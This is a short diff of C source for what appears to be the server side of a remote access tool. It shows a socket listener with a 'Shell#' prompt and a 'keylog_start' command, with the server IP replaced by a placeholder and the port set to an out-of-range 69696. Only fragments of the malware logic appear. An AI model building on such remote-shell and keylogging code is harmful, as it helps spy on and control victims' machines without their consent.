@@ -27,8 +27,8 @@ int main()
     }
 
     server_address.sin_family = AF_INET;
-    server_address.sin_addr.s_addr = inet_addr("192.168.0.99");
-    server_address.sin_port = htons(50005);
+    server_address.sin_addr.s_addr = inet_addr("xxx.xxx.x.xx"); // server ip address
+    server_address.sin_port = htons(69696);                     // listening port
 
     bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));
     puts("Binding OK");
@@ -40,7 +40,7 @@ int main()
 
     while (true)
     {
-        jump:
+    jump:
         memset(&buffer, 0, sizeof(buffer));
         memset(&response, 0, sizeof(response));
         printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr)); // prints client ip address
@@ -55,7 +55,7 @@ int main()
         {
             goto jump;
         }
-        else if (strncmp("keylog_start", buffer, 12) ==0 )
+        else if (strncmp("keylog_start", buffer, 12) == 0)
         {
             goto jump;
         }
